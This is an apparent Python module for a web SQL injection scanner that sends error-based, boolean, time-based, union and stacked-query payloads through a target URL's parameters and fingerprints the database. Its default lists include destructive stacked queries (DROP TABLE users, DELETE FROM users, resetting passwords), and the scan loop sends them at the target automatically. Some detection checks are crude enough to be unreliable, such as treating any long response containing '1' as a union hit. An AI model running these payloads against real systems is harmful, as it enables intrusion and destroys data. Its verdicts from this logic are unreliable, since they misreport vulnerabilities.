#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import random
import re
import time
import urllib.parse
from typing import Any, Dict, List, Optional, Tuple

from core.logger import (log_debug, log_error, log_info, log_success,
                         log_warning)
from modules.core.http_client import HTTPClient
from modules.core.payload_manager import PayloadManager


class SQLiScanner:
    """
    Advanced SQL Injection Scanner with Payload Manager Integration
    Supports: Error-based, Boolean-based, Time-based, Union-based,
    Stacked Queries, and Database Fingerprinting
    """

    def __init__(self, target: str, verbose: bool = False):
        self.target = target
        self.verbose = verbose
        self.client = HTTPClient(timeout=30, retries=5, verbose=verbose)
        self.payload_manager = PayloadManager(verbose=verbose)
        self.results = []
        self.db_type = None
        self.parameters = {}
        self.vulnerable_params = []
        self.payloads_tested = 0

        # Load payloads from Payload Manager
        self.error_payloads = self._load_payloads("sqli", ["error", "basic", "stacked"])
        self.bool_payloads = self._load_boolean_payloads()
        self.time_payloads = self._load_payloads("sqli", ["time"])
        self.union_payloads = self._load_payloads("sqli", ["union"])
        self.stacked_payloads = self._load_payloads("sqli", ["stacked"])

        # Fallback to default payloads if database is empty
        if not self.error_payloads:
            self.error_payloads = self._default_error_payloads()
        if not self.bool_payloads:
            self.bool_payloads = self._default_boolean_payloads()
        if not self.time_payloads:
            self.time_payloads = self._default_time_payloads()
        if not self.union_payloads:
            self.union_payloads = self._default_union_payloads()
        if not self.stacked_payloads:
            self.stacked_payloads = self._default_stacked_payloads()

        self.error_patterns = [
            r"SQL syntax",
            r"mysql_fetch",
            r"ORA-[0-9]{5}",
            r"PostgreSQL.*ERROR",
            r"SQLite/JDBCDriver",
            r"Microsoft OLE DB",
            r"Microsoft Access",
            r"Driver.*SQL Server",
            r"SQLite3::",
            r"Unclosed quotation mark",
            r"You have an error in your SQL syntax",
            r"Warning: mysql",
            r"Warning: pg_",
            r"DB Error",
            r"SQL command",
            r"invalid query",
            r"Unknown column",
            r"Table '.*' doesn't exist",
            r"Column '.*' not found",
            r"Syntax error",
            r"PDOException",
            r"SQLSTATE",
            r"mysqli_sql_exception",
            r"Division by zero",
            r"Column count doesn't match",
            r"Duplicate entry",
            r"Data truncated",
            r"Invalid use of group function",
            r"Subquery returns more than 1 row",
            r"Expression is not in GROUP BY clause",
            r"Unknown table",
            r"View '.*' doesn't exist",
            r"Can't create table",
            r"Access denied",
            r"Table '.*' is marked as crashed",
            r"Lock wait timeout exceeded",
            r"Deadlock found when trying to get lock",
        ]

        self.db_signatures = {
            "mysql": [
                r"mysql_fetch",
                r"MySQLSyntaxError",
                r"SQL syntax.*MySQL",
                r"Warning.*mysql",
                r"MariaDB",
                r"MySQL server version",
            ],
            "postgresql": [
                r"PostgreSQL.*ERROR",
                r"pg_query",
                r"PostgreSQL",
                r"PG::Error",
            ],
            "mssql": [
                r"Microsoft OLE DB",
                r"Microsoft SQL Server",
                r"Driver.*SQL Server",
                r"SQLServer",
                r"MSSQL",
            ],
            "oracle": [r"ORA-[0-9]{5}", r"Oracle Database", r"Oracle.*Driver", r"PLS-"],
            "sqlite": [
                r"SQLite/JDBCDriver",
                r"SQLite3::",
                r"SQLite",
                r"SQLiteException",
            ],
            "access": [
                r"Microsoft Access",
                r"Access Database",
                r"Microsoft JET Database Engine",
            ],
        }

        self.fingerprint_payloads = {
            "mysql": [
                "' AND 1=CAST(0x41414141 AS INT)--",
                "' AND 1=CONVERT(INT,0x41414141)--",
                "' AND 1=UNHEX(HEX(1))--",
            ],
            "postgresql": [
                "' AND 1=CAST(0x41414141 AS INT)--",
                "' AND 1=CONVERT(INT,0x41414141)--",
            ],
            "mssql": [
                "' AND 1=CAST(0x41414141 AS INT)--",
                "' AND 1=CONVERT(INT,0x41414141)--",
            ],
            "oracle": ["' AND 1=TO_NUMBER('1')--", "' AND 1=CAST('1' AS INT)--"],
            "sqlite": [
                "' AND 1=CAST(0x41414141 AS INT)--",
                "' AND 1=CONVERT(INT,0x41414141)--",
            ],
        }

    def _load_payloads(self, category: str, tags: List[str]) -> List[str]:
        """Load payloads from Payload Manager by category and tags"""
        payloads = []
        for tag in tags:
            results = self.payload_manager.get_payloads(category, tags=[tag], limit=50)
            for p in results:
                if "value" in p:
                    payloads.append(p["value"])
        return list(set(payloads))

    def _load_boolean_payloads(self) -> List[Tuple[str, str]]:
        """Load boolean-based payloads (true/false pairs)"""
        # Boolean payloads are not stored as pairs in the database
        # Use default pairs
        return [
            ("' AND 1=1--", "' AND 1=2--"),
            ("' OR 1=1--", "' OR 1=2--"),
            ("' AND '1'='1", "' AND '1'='2"),
            ("' OR '1'='1", "' OR '1'='2"),
            ("' AND SLEEP(5)--", "' AND SLEEP(0)--"),
            ("1' AND '1'='1", "1' AND '1'='2"),
            ("1' OR '1'='1", "1' OR '1'='2"),
            ("') AND '1'='1--", "') AND '1'='2--"),
            ("') OR '1'='1--", "') OR '1'='2--"),
        ]

    def _default_error_payloads(self) -> List[str]:
        return [
            "'",
            '"',
            "' OR '1'='1",
            "' OR 1=1--",
            "' OR 1=1#",
            "' AND 1=1--",
            "' AND 1=2--",
            "' AND '1'='1",
            "' AND '1'='2",
            "' OR '1'='1' --",
            "' OR '1'='1' #",
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION SELECT @@version--",
            "' UNION SELECT database()--",
            "' UNION SELECT user()--",
            "' UNION SELECT version()--",
            "'; DROP TABLE users--",
            "'; DROP TABLE users#",
            "') OR '1'='1--",
            "') OR '1'='1#",
            "')) OR '1'='1--",
            "')) OR '1'='1#",
            "' AND SLEEP(5)--",
            "' OR SLEEP(5)--",
            "1' AND SLEEP(5)--",
            "1' OR SLEEP(5)#",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "' OR (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "' AND BENCHMARK(1000000,MD5(1))--",
            "' OR BENCHMARK(1000000,MD5(1))--",
        ]

    def _default_boolean_payloads(self) -> List[Tuple[str, str]]:
        return [
            ("' AND 1=1--", "' AND 1=2--"),
            ("' OR 1=1--", "' OR 1=2--"),
            ("' AND '1'='1", "' AND '1'='2"),
            ("' OR '1'='1", "' OR '1'='2"),
            ("' AND SLEEP(5)--", "' AND SLEEP(0)--"),
        ]

    def _default_time_payloads(self) -> List[str]:
        return [
            "' AND SLEEP(5)--",
            "' OR SLEEP(5)--",
            "1' AND SLEEP(5)#",
            "1' OR SLEEP(5)#",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "' OR (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)#",
            "' OR (SELECT * FROM (SELECT(SLEEP(5)))a)#",
            "'; WAITFOR DELAY '0:0:5'--",
            "') WAITFOR DELAY '0:0:5'--",
        ]

    def _default_union_payloads(self) -> List[str]:
        return [
            "1' UNION SELECT NULL--",
            "1' UNION SELECT NULL,NULL--",
            "1' UNION SELECT NULL,NULL,NULL--",
            "1' UNION SELECT NULL,NULL,NULL,NULL--",
            "1' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
            "1' UNION SELECT version()--",
            "1' UNION SELECT database()--",
            "1' UNION SELECT user()--",
        ]

    def _default_stacked_payloads(self) -> List[str]:
        return [
            "1'; DROP TABLE users--",
            "1'; DELETE FROM users--",
            "1'; UPDATE users SET password=''--",
            "1'; INSERT INTO users VALUES('')--",
            "1'; CREATE TABLE test(id int)--",
            "1'; ALTER TABLE users ADD COLUMN test int--",
        ]

    def extract_params(self) -> Dict:
        parsed = urllib.parse.urlparse(self.target)
        if not parsed.query:
            return {}
        return urllib.parse.parse_qs(parsed.query)

    def build_url(self, params: Dict) -> str:
        parsed = urllib.parse.urlparse(self.target)
        new_query = urllib.parse.urlencode(params, doseq=True)
        return urllib.parse.urlunparse(parsed._replace(query=new_query))

    def fingerprint_database(self, param: str, original_value: str) -> Optional[str]:
        log_info("Fingerprinting database type...")
        for db_type, payloads in self.fingerprint_payloads.items():
            for payload in payloads:
                params = self.extract_params()
                params[param] = [payload]
                test_url = self.build_url(params)
                resp = self.client.get(test_url)
                if resp:
                    for sig in self.db_signatures.get(db_type, []):
                        if re.search(sig, resp.text, re.IGNORECASE):
                            log_success(f"Database identified: {db_type.upper()}")
                            return db_type
        return None

    def test_error_based(self, param: str, payload: str) -> bool:
        params = self.extract_params()
        if param in params:
            params[param] = [payload]
        else:
            params[param] = payload
        test_url = self.build_url(params)
        resp = self.client.get(test_url)
        if not resp:
            return False
        self.payloads_tested += 1
        for pattern in self.error_patterns:
            if re.search(pattern, resp.text, re.IGNORECASE):
                result = {
                    "type": "error_based",
                    "param": param,
                    "payload": payload,
                    "url": test_url,
                    "pattern": pattern,
                    "status": resp.status_code,
                }
                self.results.append(result)
                self.vulnerable_params.append(param)
                log_success(
                    f"Error-based SQLi found on {param} with payload: {payload[:50]}..."
                )
                return True
        return False

    def test_boolean_based(
        self, param: str, true_payload: str, false_payload: str
    ) -> bool:
        params = self.extract_params()
        if param not in params:
            return False
        params_true = params.copy()
        params_true[param] = [true_payload]
        url_true = self.build_url(params_true)
        params_false = params.copy()
        params_false[param] = [false_payload]
        url_false = self.build_url(params_false)
        resp_true = self.client.get(url_true)
        resp_false = self.client.get(url_false)
        if not resp_true or not resp_false:
            return False
        self.payloads_tested += 2
        diff = abs(len(resp_true.text) - len(resp_false.text))
        if diff > 50 or (resp_true.status_code != resp_false.status_code):
            result = {
                "type": "boolean_based",
                "param": param,
                "true_payload": true_payload,
                "false_payload": false_payload,
                "true_length": len(resp_true.text),
                "false_length": len(resp_false.text),
                "difference": diff,
                "status": resp_true.status_code,
            }
            self.results.append(result)
            self.vulnerable_params.append(param)
            log_success(f"Boolean-based SQLi found on {param} (diff: {diff})")
            return True
        return False

    def test_time_based(self, param: str, payload: str, threshold: float = 4.0) -> bool:
        params = self.extract_params()
        if param in params:
            params[param] = [payload]
        else:
            params[param] = payload
        test_url = self.build_url(params)
        start = time.time()
        resp = self.client.get(test_url, timeout=15)
        elapsed = time.time() - start
        self.payloads_tested += 1
        if resp and elapsed >= threshold:
            result = {
                "type": "time_based",
                "param": param,
                "payload": payload[:50] + "...",
                "elapsed": elapsed,
                "url": test_url,
            }
            self.results.append(result)
            self.vulnerable_params.append(param)
            log_success(f"Time-based SQLi found on {param} (took {elapsed:.2f}s)")
            return True
        return False

    def test_union_based(self, param: str, payload: str) -> bool:
        params = self.extract_params()
        if param in params:
            params[param] = [payload]
        else:
            params[param] = payload
        test_url = self.build_url(params)
        resp = self.client.get(test_url)
        if not resp:
            return False
        self.payloads_tested += 1
        if "NULL" in resp.text or "0" in resp.text or "1" in resp.text:
            if len(resp.text) > 100:
                result = {
                    "type": "union_based",
                    "param": param,
                    "payload": payload,
                    "url": test_url,
                    "status": resp.status_code,
                    "length": len(resp.text),
                }
                self.results.append(result)
                self.vulnerable_params.append(param)
                log_success(
                    f"Union-based SQLi found on {param} with payload: {payload[:50]}..."
                )
                return True
        return False

    def test_stacked(self, param: str, payload: str) -> bool:
        params = self.extract_params()
        if param in params:
            params[param] = [payload]
        else:
            params[param] = payload
        test_url = self.build_url(params)
        resp = self.client.get(test_url)
        if not resp:
            return False
        self.payloads_tested += 1
        if "syntax" in resp.text.lower() or "error" in resp.text.lower():
            result = {
                "type": "stacked",
                "param": param,
                "payload": payload,
                "url": test_url,
                "status": resp.status_code,
            }
            self.results.append(result)
            self.vulnerable_params.append(param)
            log_success(f"Stacked query SQLi found on {param}")
            return True
        return False

    def run(self) -> Dict:
        log_info(f"Starting SQL Injection scan on: {self.target}")
        params = self.extract_params()
        if not params:
            log_warning(
                "No GET parameters found. SQLi scan works best with parameters like ?id=1"
            )
            return {
                "target": self.target,
                "scan_type": "sqli",
                "total_params": 0,
                "vulnerable_count": 0,
                "vulnerabilities": [],
                "payloads_tested": 0,
                "db_type": None,
            }
        log_info(f"Found {len(params)} parameter(s): {', '.join(params.keys())}")
        self.parameters = params
        self.payloads_tested = 0
        for param in params.keys():
            original_value = params[param][0] if params[param] else "1"
            log_info(f"Testing parameter: {param} (original: {original_value})")
            if not self.db_type:
                self.db_type = self.fingerprint_database(param, original_value)
                if self.db_type:
                    log_success(f"Database type: {self.db_type.upper()}")
            log_info("  Testing Error-based...")
            for payload in self.error_payloads[:30]:
                if self.test_error_based(param, payload):
                    break
            log_info("  Testing Boolean-based...")
            for true_payload, false_payload in self.bool_payloads:
                if self.test_boolean_based(param, true_payload, false_payload):
                    break
            log_info("  Testing Time-based...")
            for payload in self.time_payloads[:10]:
                if self.test_time_based(param, payload):
                    break
            log_info("  Testing Union-based...")
            for payload in self.union_payloads[:10]:
                if self.test_union_based(param, payload):
                    break
            log_info("  Testing Stacked queries...")
            for payload in self.stacked_payloads[:5]:
                if self.test_stacked(param, payload):
                    break
        log_success(f"SQLi scan completed. Found {len(self.results)} vulnerabilities.")
        log_info(f"Total payloads tested: {self.payloads_tested}")
        log_info(f"Vulnerable parameters: {len(self.vulnerable_params)}")
        return {
            "target": self.target,
            "scan_type": "sqli",
            "total_params": len(params),
            "vulnerable_count": len(self.results),
            "vulnerable_params": self.vulnerable_params,
            "vulnerabilities": self.results,
            "payloads_tested": self.payloads_tested,
            "db_type": self.db_type,
        }
